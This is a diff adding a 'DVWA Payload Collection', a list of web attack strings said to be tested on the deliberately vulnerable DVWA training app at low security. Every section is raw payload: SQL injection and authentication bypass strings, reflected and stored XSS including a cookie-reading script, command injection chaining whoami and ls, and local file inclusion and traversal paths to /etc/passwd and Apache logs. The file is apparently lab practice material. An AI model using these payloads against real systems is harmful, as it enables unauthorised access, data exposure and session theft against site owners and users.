@@ -1,8 +1,87 @@
-SQL Injection:
-' OR '1'='1
+# ===============================
 
-XSS:
+# DVWA Payload Collection
+
+# ===============================
+
+# -------------------------------
+
+# SQL Injection
+
+# -------------------------------
+
+1' OR '1'=1
+' OR '1'='1' --
+admin' --
+' OR 1=1 #
+" OR "" = "
+
+# -------------------------------
+
+# Reflected XSS
+
+# -------------------------------
+
 <script>alert(1)</script>
 
-Command Injection:
-; ls
+<script>document.body.innerHTML="Hacked"</script>
+
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+
+# -------------------------------
+
+# Stored XSS
+
+# -------------------------------
+
+<script>alert('stored xss')</script>
+
+<script>console.log(document.cookie)</script>
+
+# -------------------------------
+
+# Command Injection
+
+# -------------------------------
+
+127.0.0.1; whoami
+127.0.0.1 && ls
+127.0.0.1 | pwd
+
+# -------------------------------
+
+# File Inclusion (LFI)
+
+# -------------------------------
+
+../../../../etc/passwd
+../../../../etc/hosts
+../../../../var/log/apache2/access.log
+
+# -------------------------------
+
+# Authentication Bypass
+
+# -------------------------------
+
+admin' --
+' OR '1'='1
+
+# -------------------------------
+
+# Directory Traversal
+
+# -------------------------------
+
+../
+../../
+../../../etc/passwd
+
+# ===============================
+
+# NOTE:
+
+# All payloads tested in DVWA (LOW security level)
+
+# ===============================
